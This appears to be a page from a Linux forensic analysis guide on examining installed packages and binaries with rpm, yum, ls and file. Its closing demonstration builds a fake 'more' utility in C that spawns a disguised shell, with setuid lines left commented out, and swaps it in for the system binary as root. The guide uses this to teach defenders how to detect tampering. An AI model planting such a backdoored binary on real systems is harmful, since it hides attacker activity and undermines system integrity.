---
layout: default
title: Applications
parent: Linux Analysis
nav_order: 2
---

## Applications
The term applications is used to describe utilities and their associated packages.
In Linux, this essentially means anything that is natively installed as part of a distribution, installed through an update manager, or obtained from a third-party source.
Although we can have confidence in natively installed applications along with those obtained through legitimate sources, the opportunity for compromise is still present.
Our main security concerns with applications come from those not obtained through legitimate sources.
Manipulating applications one of the many defense evasion techniques and is often used by rootkits.
Knowing how and where to find application information is important to assessing applications as valid or malicious.  
  
__Installed Packages:__
```bash
rpm -qa
# The rpm utility is the RPM Package Manager used to manage packages of type .rpm.
# The -q option is used for queries.
# The -a option is used as a select-option to select all packages.
```
```bash
yum list installed
# The yum utility is the Yellowdog Updater Modified, which is essentially an interactive front end for rpm.
# The list option is used to list various information specified by a following option.
# The installed option is used to display information only about installed packages.
```
```bash
rpm -qa --last | less
# The --last option lists all installed packages in order of installation date, from newest to oldest.
# Piping into less let's us explore package installation dates in chunks.
```
__Individual Package Information:__
```bash
rpm -ql <PACKAGE_NAME>
# The -l option is used for listing.
# This command allows us to see all the files associated with an installed package.
```
```bash
rpm -qi <PACKAGE_NAME>
# The -i option is used for info.
# This command allows us to see general information for a specific package.
```
__Exploring Binaries:__
```bash
ls -haltr /<BINARY_DIRECTORY>/
# The -t option is used to list contents by modification time. By default, it lists newest modification first.
# The -r option is used to reverse the sorting of contents. Used in conjunction with -t, it lists newest modification last.
```
```bash
ls -lai | sort -n
# The -i option is used to print the inode number of each file.
# The sort utility is used sort lines of text.
# The sort -n option sorts the output numerically.
```
```bash
which <COMMAND>
# The which utility is used to show the full path of a specified command.
# Remember that a command references an actual physical file that is in an executable format. In Linux, that format is ELF, or executable and linkable format.
```
```bash
ls -l <COMMAND_PATH>
# Shows general file information for a command binary.
```
```bash
file <COMMAND_PATH>
# Shows type information for a command binary.
```
__Package Verification:__
```bash
rpm -Va
# The -V option is used to verify.
# S is file size.
# M is file mode.
# 5 is MD5 hash of file.
# D is file's major and minor numbers.
# L is file's symbolic link contents.
# U is file owner.
# G is file's group.
# T is modification time.
# c appears if file is a configuration file.
# Source: http://ftp.rpm.org/max-rpm/s1-rpm-verify-output.html
```
__Individual Package Verification:__
```bash
rpm -V <PACKAGE_NAME>
# Verifies package and associated files.
```
```bash
rpm -Vf <FILE_NAME>
# Verifies package that owns the file FILE_NAME
```
  
#### Demonstration:
We'll create our own "backdoored" binary to demonstrate how to find malicious applications using some of the mentioned techniques.
First, make a copy of the 'more' utility and save it to the /tmp directory using the command:
```bash
cp /usr/bin/more /tmp/
```
Then, rename the real more utility in its current location to 'more.bak':
```bash
mv /usr/bin/more /usr/bin/more.bak
```
Next, we'll create our faux 'more' utility to replace the legitimate one.
Using the text editor of your choice, create a C program file titled 'more.c' with the following contents:
```C
#include <stdio.h>
#include <unistd.h>
/*C program used to spawn a /bin/sh process disguised as a more process. */

int main() {
        /*setuid(0);
        setgid(0);*/
        execl("/bin/sh", "more", NULL);
        return 0;
}
```
If you're familiar with C, don't worry about the commented section yet, we'll be using it later to demonstrate another concept (spoiler alert).
Compile your C program using the syntax:
```bash
gcc more.c -o more
```
Now that our imposter binary is created, let's do some quick fixes to make it look like the legitimate 'more' utility. We'll first change the permissions to match the original:
```bash
chmod 755 more
```
Next, we'll change the owner to root (if not already the owner):
```bash
chown root:root more
```
Lastly, we need to replace the legitimate one using the command:
```bash
mv more /usr/bin/more
```
Before we put our "backdoored" utility into action, let's take a look at it in context with other utilities present in the /usr/bin directory, specifically the legitimate 'more' utility:
```bash
ls -al /usr/bin | less
# To compare it to all utilities.
ls -al /usr/bin | grep more
# To compare it to the real 'more'.
```
Are there any immediate tip-offs that it may have been tampered with?
Go ahead and use the fake 'more' utility to "read a file":
```bash
more /etc/passwd
```
What actually happened? Take a look at the current running process list:
```bash
ps aux
```
We see the process titled 'more', but we actually spawned another shell process. This demonstrates how an attacker might be able to cover their activities using altered applications with legitimate names.
Use some of the other methods to identify other cues that this utility has been altered.
When you're done, you can replace your faux 'more' binary with the legitimate one by using the command:
```bash
mv /usr/bin/more.bak /usr/bin/more
```
